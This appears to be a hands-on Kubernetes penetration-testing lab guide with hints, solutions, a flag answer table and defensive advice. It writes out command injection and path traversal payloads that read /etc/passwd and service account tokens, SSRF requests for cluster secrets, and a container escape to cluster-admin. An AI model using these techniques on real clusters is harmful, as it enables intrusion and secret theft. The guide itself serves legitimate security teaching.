# Advanced Attack Scenario: Multi-Path Cluster Compromise

A realistic attack simulation with multiple entry points and attack paths. Find your own way through the cluster.

## Scenario Background

You're conducting a penetration test against ACME Corporation's Kubernetes infrastructure. Initial reconnaissance has revealed two externally-accessible web applications. Your objective is to compromise the cluster and obtain sensitive data.

Unlike the basic scenario, there's no single "correct" path. Multiple vulnerabilities exist, and different attack chains can lead to the same objectives. Document everything you find.

## Objectives

| Priority | Objective | Description |
|----------|-----------|-------------|
| 🎯 | Database Credentials | Find the production database password |
| 🎯 | Payment Gateway Key | Access the payment processing API key |
| 🎯 | Internal API Key | Obtain the internal service API key |
| 👑 | Crown Jewels | Retrieve CEO credentials from the secrets vault |
| 💀 | Host Access | Escape container and access host filesystem |
| 🏆 | Cluster Admin | Achieve full cluster-admin privileges |

## Setup

```bash
cd exercises/
chmod +x advanced-attack-setup.sh
./advanced-attack-setup.sh
```

The setup script will display target URLs when complete.

## Target Information

### External Attack Surface

| Service | URL | Description |
|---------|-----|-------------|
| Admin Panel | http://localhost:30081 | Administrative dashboard |
| Legacy App | http://localhost:30082 | Legacy customer portal |

### Known Information

- ACME Corp uses Kubernetes for their infrastructure
- Multiple internal services exist
- Some services may have default or weak credentials
- Legacy systems may have security issues

---

## Attack Paths Overview

```
                            ┌─────────────────────┐
                            │   EXTERNAL ACCESS   │
                            └─────────────────────┘
                                      │
                    ┌─────────────────┼─────────────────┐
                    ▼                 ▼                 ▼
            ┌──────────────┐  ┌──────────────┐  ┌──────────────┐
            │ Admin Panel  │  │  Legacy App  │  │   Recon &    │
            │ Port 30081   │  │  Port 30082  │  │  Enumeration │
            └──────────────┘  └──────────────┘  └──────────────┘
                    │                 │                 │
        ┌───────────┼───────┐         │         ┌───────┴───────┐
        ▼           ▼       ▼         ▼         ▼               ▼
   ┌─────────┐ ┌─────────┐ ┌───────────────┐ ┌─────────┐ ┌───────────┐
   │ Default │ │ Config  │ │   Command     │ │  Path   │ │  Hidden   │
   │ Creds   │ │ Exposed │ │   Injection   │ │Traversal│ │ Endpoints │
   └─────────┘ └─────────┘ └───────────────┘ └─────────┘ └───────────┘
        │           │               │               │           │
        └───────────┴───────┬───────┴───────────────┴───────────┘
                            ▼
                   ┌─────────────────┐
                   │  INITIAL ACCESS │
                   │  (Pod Shell)    │
                   └─────────────────┘
                            │
            ┌───────────────┼───────────────┐
            ▼               ▼               ▼
    ┌──────────────┐ ┌──────────────┐ ┌──────────────┐
    │  Env Vars    │ │    SSRF to   │ │   Service    │
    │  Secrets     │ │ Internal API │ │   Account    │
    └──────────────┘ └──────────────┘ └──────────────┘
            │               │               │
            └───────────────┼───────────────┘
                            ▼
                   ┌─────────────────┐
                   │ LATERAL MOVEMENT│
                   └─────────────────┘
                            │
            ┌───────────────┼───────────────┐
            ▼               ▼               ▼
    ┌──────────────┐ ┌──────────────┐ ┌──────────────┐
    │   Exec to    │ │   Read       │ │  Privileged  │
    │ Other Pods   │ │  Secrets     │ │    Pods      │
    └──────────────┘ └──────────────┘ └──────────────┘
                            │
                            ▼
                   ┌─────────────────┐
                   │ PRIVILEGE ESCAL │
                   │  Host Access    │
                   │  Cluster Admin  │
                   └─────────────────┘
```

---

## Reconnaissance Phase

Before diving in, gather information about the targets.

### Web Application Enumeration

```bash
# Check what's running on each port
curl -s http://localhost:30081 | head -20
curl -s http://localhost:30082 | head -20

# Look for common files
for port in 30081 30082; do
    echo "=== Port $port ==="
    curl -s http://localhost:$port/robots.txt
    curl -s http://localhost:$port/health
    curl -s http://localhost:$port/.git/config
done

# Directory enumeration (if you have gobuster/dirb)
# gobuster dir -u http://localhost:30081 -w /path/to/wordlist.txt
```

### Questions to Answer

- What technologies are in use?
- Are there any exposed endpoints?
- What functionality do the applications offer?
- Are there any hints about internal services?

---

## Initial Access Paths

### Path A: Admin Panel - Default Credentials

<details>
<summary>Hints</summary>

1. What credentials might an administrator use by default?
2. Common defaults: admin/admin, admin/password, administrator/administrator
3. The login page might give hints about valid usernames

</details>

<details>
<summary>Solution</summary>

```bash
# Try default credentials
# admin:admin works!

# Once logged in, explore:
# - /config exposes database credentials
# - /console allows command execution (admin only)
# - /debug/env exposes all environment variables
```

**Credentials that work:**
- admin:admin (full access)
- operator:operator123 (limited access)
- guest:guest (read-only)

</details>

### Path B: Admin Panel - Information Disclosure

<details>
<summary>Hints</summary>

1. Not all endpoints require authentication
2. Debug endpoints are often left exposed
3. Try common debug paths: /debug, /debug/env, /debug/config

</details>

<details>
<summary>Solution</summary>

```bash
# This endpoint is exposed without authentication!
curl -s http://localhost:30081/debug/env | jq .

# Returns all environment variables including:
# - DB_PASSWORD
# - INTERNAL_API_KEY
```

</details>

### Path C: Legacy App - Command Injection

<details>
<summary>Hints</summary>

1. The legacy app has a "DNS Lookup" feature
2. How might nslookup be implemented on the backend?
3. What happens if you add shell metacharacters?

</details>

<details>
<summary>Solution</summary>

```bash
# Navigate to http://localhost:30082/lookup
# Enter: ; id
# Or: $(id)
# Or: `id`

# You'll see command output, confirming command injection

# Get a feel for the environment:
# ; whoami
# ; ls -la
# ; cat /etc/passwd
# ; env
```

</details>

### Path D: Legacy App - Path Traversal

<details>
<summary>Hints</summary>

1. The download feature takes a filename parameter
2. What if the filename includes `../`?
3. What interesting files exist on Linux systems?

</details>

<details>
<summary>Solution</summary>

```bash
# Try to read /etc/passwd
curl "http://localhost:30082/download?file=../../../etc/passwd"

# Read environment (process info)
curl "http://localhost:30082/download?file=../../../proc/self/environ"

# Service account token
curl "http://localhost:30082/download?file=../../../var/run/secrets/kubernetes.io/serviceaccount/token"
```

</details>

### Path E: Legacy App - Hidden Backup Endpoint

<details>
<summary>Hints</summary>

1. Check robots.txt for disallowed paths
2. Backup files often contain credentials
3. Look for paths like /backup, /backup/, /backup/credentials

</details>

<details>
<summary>Solution</summary>

```bash
# Check robots.txt
curl http://localhost:30082/robots.txt

# Access the backup endpoint
curl http://localhost:30082/backup/db-credentials.txt
```

</details>

### Path F: Legacy App - Admin Panel (No Auth)

<details>
<summary>Hints</summary>

1. The legacy app has an /admin endpoint
2. Old applications often lack authentication
3. Direct command execution might be possible

</details>

<details>
<summary>Solution</summary>

```bash
# Navigate to http://localhost:30082/admin
# The admin panel has no authentication!
# Direct command execution is available
```

</details>

---

## Lateral Movement

Once you have initial access, explore the internal network.

### Discovering Internal Services

<details>
<summary>From a compromised pod</summary>

```bash
# Using command injection or exec access:

# Check for internal DNS
; cat /etc/resolv.conf

# Enumerate services via DNS
; nslookup internal-api.internal-apps.svc.cluster.local

# Scan common ports on discovered services
; curl -s http://internal-api.internal-apps.svc/

# List Kubernetes API resources (if SA has permissions)
; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
; curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces
```

</details>

### SSRF via Internal API

<details>
<summary>If you can reach internal-api</summary>

```bash
# The internal API has an SSRF vulnerability
# Use it to access the Kubernetes API or cloud metadata

# Via command injection, reach the internal API:
; curl -s http://internal-api.internal-apps.svc/api/fetch \
    -H "Content-Type: application/json" \
    -d '{"url": "http://kubernetes.default.svc/api/v1/namespaces"}'

# Access Kubernetes secrets via SSRF
; curl -s http://internal-api.internal-apps.svc/api/fetch \
    -H "Content-Type: application/json" \
    -d '{"url": "https://kubernetes.default.svc/api/v1/namespaces/payments/secrets/payment-gateway-key"}'

# The internal API SA has cluster-wide secret read access!
```

</details>

### Service Account Token Abuse

<details>
<summary>Check your permissions</summary>

```bash
# Get your token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# What can this service account do?
curl -sk -H "Authorization: Bearer $TOKEN" \
    $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
    -X POST -H "Content-Type: application/json" \
    -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'

# Try listing secrets in various namespaces
for ns in default payments database secrets-vault kube-system; do
    echo "=== $ns ==="
    curl -sk -H "Authorization: Bearer $TOKEN" \
        $APISERVER/api/v1/namespaces/$ns/secrets 2>/dev/null | head -5
done
```

</details>

---

## Privilege Escalation

### Finding Privileged Pods

<details>
<summary>Enumerate pods you can access</summary>

```bash
# List pods across namespaces
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

curl -sk -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default.svc/api/v1/pods | grep '"name"'

# Look for pods with:
# - privileged: true
# - hostPath mounts
# - hostPID/hostNetwork: true

# Check specific pod details
curl -sk -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default.svc/api/v1/namespaces/internal-apps/pods/debug-tools | \
    grep -E "privileged|hostPath"
```

</details>

### Escaping to the Host

<details>
<summary>Via privileged pod</summary>

```bash
# If you can exec into debug-tools pod:
kubectl exec -it -n internal-apps debug-tools -- /bin/sh

# The host filesystem is at /host
ls /host
cat /host/etc/flag-host.txt

# Access k3s credentials
cat /host/etc/rancher/k3s/k3s.yaml
```

</details>

<details>
<summary>Via backup-agent (limited host access)</summary>

```bash
# The backup-agent has /var mounted read-only
kubectl exec -it -n database backup-agent -- /bin/sh

# Check what's accessible
ls /host-var/
cat /host-var/secrets/sensitive.txt

# This gives partial host access but not full root
```

</details>

### Cluster Admin Access

<details>
<summary>Final escalation</summary>

```bash
# From the debug-tools pod with host access:

# Get the admin kubeconfig
cp /host/etc/rancher/k3s/k3s.yaml /tmp/admin.yaml
sed -i 's|127.0.0.1|kubernetes.default.svc|g' /tmp/admin.yaml

# Install kubectl
apk add --no-cache curl
curl -LO "https://dl.k8s.io/release/$(curl -sL https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl

export KUBECONFIG=/tmp/admin.yaml

# Verify cluster-admin
./kubectl auth can-i '*' '*'
# yes

# Get the final flag
./kubectl get secret -n kube-system cluster-admin-flag -o jsonpath='{.data.flag}' | base64 -d

# Get all the secrets
./kubectl get secrets -A
./kubectl get secret -n secrets-vault executive-credentials -o yaml
```

</details>

---

## Flag Locations Summary

| Flag | Value | How to Find |
|------|-------|-------------|
| Database Credentials | `flag-db-cr3d5-4r3-s3cr3t` | Env vars, /config endpoint, /debug/env, backup files |
| Payment Gateway Key | `flag-p4ym3nt-k3y-9876` | Kubernetes secret in payments namespace |
| Internal API Key | `flag-1nt3rn4l-4p1-k3y` | Env vars, debug endpoints |
| Backup Encryption Key | `flag-b4ckup-3ncrypt10n-k3y` | Env vars in legacy app, database secrets |
| Host Flag | `flag-h0st-4cc3ss-ach13v3d` | /etc/flag-host.txt via privileged container |
| Var Secrets Flag | `flag-v4r-s3cr3ts-f0und` | /var/secrets/sensitive.txt via backup-agent |
| CEO Password | `flag-cr0wn-j3w3ls-c30-p4ss` | secrets-vault namespace, requires cluster-read or admin |
| Board Access Token | `flag-b04rd-4cc3ss-t0k3n` | Same secret as CEO credentials |
| Cluster Admin | `flag-CLUSTER-ADMIN-ACHIEVED` | kube-system namespace, requires cluster-admin |

---

## Vulnerabilities Checklist

Document which vulnerabilities you found:

### Web Application Layer
- [ ] Default credentials (admin:admin)
- [ ] Exposed debug endpoint (/debug/env)
- [ ] Command injection (DNS lookup)
- [ ] Command injection (Admin panel)
- [ ] Path traversal (Download feature)
- [ ] Information disclosure (robots.txt)
- [ ] Exposed backup files
- [ ] No authentication on admin functions
- [ ] SSRF in internal API

### Kubernetes Layer
- [ ] Secrets in environment variables
- [ ] Overprivileged service accounts
- [ ] Cross-namespace secret access
- [ ] Privileged containers
- [ ] Host filesystem mounts
- [ ] Missing network policies
- [ ] Service account token auto-mount

### Attack Chains Discovered
- [ ] External → Default creds → Config exposure → Database creds
- [ ] External → Command injection → SA token → Secret access
- [ ] External → SSRF → Internal API → Cluster secrets
- [ ] Internal → Privileged pod → Host escape → Cluster admin

---

## Cleanup

```bash
./advanced-attack-cleanup.sh
```

---

## Defensive Recommendations

Based on what you exploited, here's how to defend:

### Application Security
1. Never use default credentials
2. Remove debug endpoints in production
3. Sanitize all user input (use parameterized commands)
4. Implement proper authentication on all endpoints
5. Validate and restrict file paths

### Kubernetes Security
1. Use Secrets mounted as files, not env vars
2. Follow least-privilege for service accounts
3. Use namespace-scoped Roles, not ClusterRoles
4. Block privileged containers with Pod Security Admission
5. Never mount host filesystem
6. Implement network policies
7. Disable service account token auto-mounting
8. Regular security scanning with kubescape/kube-bench

---

## Next Steps

1. **Fix the vulnerabilities** and verify attacks no longer work
2. **Try Kubernetes Goat** for more scenarios
3. **Set up Falco** for runtime detection
4. **Implement OPA/Kyverno** for policy enforcement